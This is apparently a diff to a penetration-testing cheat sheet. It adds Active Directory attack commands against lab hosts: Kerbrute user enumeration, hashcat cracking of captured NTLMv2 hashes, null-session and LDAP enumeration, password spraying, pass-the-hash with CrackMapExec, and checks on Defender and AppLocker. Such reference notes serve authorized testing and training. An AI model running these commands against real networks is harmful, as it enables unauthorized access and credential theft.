@@ -375,3 +375,63 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 # Testing the SMTP service for the open-relay vulnerability.
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
 ```
+## Active Directory
+#### Initial Enumeration
+```
+# Performs a ping sweep on the specified network segment from a Linux-based host
+fping -asgq 172.16.5.0/23
+
+# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
+./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
+```
+##### LLMNR/NTB-NS Poisoning
+```
+# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+```
+##### Password Spraying & Password Policies
+```
+# Uses CME to extract  password policy
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+
+# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
+rpcclient -U "" -N 172.16.5.5
+
+# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
+rpcclient $> querydominfo
+
+# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+# Used to enumerate the password policy in a Windows domain from a Windows-based host.
+net accounts
+
+# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
+Get-DomainPolicy
+
+# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
+rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser
+
+# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
+crackmapexec smb 172.16.5.5 --users
+
+# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+
+# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+
+# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
+sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+
+# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+## Enumerating Security Controls AntiVirus
+```
+# PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.
+Get-MpComputerStatus
+
+# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
